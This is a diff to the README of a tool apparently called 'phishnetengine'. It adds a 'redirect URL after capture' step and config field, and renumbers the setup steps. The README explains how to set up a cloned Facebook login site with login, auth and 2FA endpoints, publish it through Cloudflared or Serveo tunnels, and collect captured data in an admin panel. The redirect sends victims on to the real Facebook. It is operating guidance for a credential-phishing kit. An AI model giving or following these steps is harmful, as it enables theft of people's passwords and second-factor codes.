@@ -63,6 +63,7 @@ node phishnetengine
 # 2. Enter project name (e.g., facebook-login)
 # 3. Enter site name (e.g., facebook)  
 # 4. Enter endpoints (e.g., /login,/auth,/2fa)
+# 5. Enter Redirect URL after capture (e.g., https://www.facebook.com)
 
 # stop it press ctrl+c
 
@@ -72,9 +73,9 @@ cp -r /path/to/your/cloned/site/* sites/facebook-login/
 # Run the engine again
 node phishnetengine
 
-# 5. Choose "Load existing project"
-# 6. Select your project (e.g., "facebook-login")
-# 7. Select tunnel method (Cloudflared or Serveo)
+# 6. Choose "Load existing project"
+# 7. Select your project (e.g., "facebook-login")
+# 8. Select tunnel method (Cloudflared or Serveo)
 
 # Access your site via the public URL shown
 # Access admin panel at: http://localhost:3000/admin-RANDOMTOKEN
@@ -117,6 +118,7 @@ phishnet-engine/
   "name": "facebook-login",
   "site": "facebook",
   "endpoints": ["/login", "/auth", "/2fa"],
+   "redirect": "https://www.facebook.com",
   "port": 3000,
   "created": 1678901234567
 }
